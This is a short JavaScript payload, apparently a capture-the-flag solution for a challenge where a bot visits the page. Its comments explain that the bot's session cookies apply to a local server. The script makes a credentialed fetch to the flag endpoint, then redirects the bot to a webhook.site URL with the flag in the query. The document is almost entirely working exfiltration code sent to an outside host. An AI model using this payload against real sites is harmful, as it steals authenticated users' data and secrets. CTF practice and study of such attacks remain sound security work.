<script>
  // Bot lands here. Its cookies are for 127.0.0.1:5000
  // We navigate it to the flag endpoint (same origin for the bot = cookies sent)
  // Then redirect to our server with the flag

  fetch('http://127.0.0.1:5000/api/fetchflag', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // Exfil: navigate the bot to your server with flag in URL
      window.location = 'https://webhook.site/YOUR-ID?flag=' + encodeURIComponent(data.flag);
    });
</script>
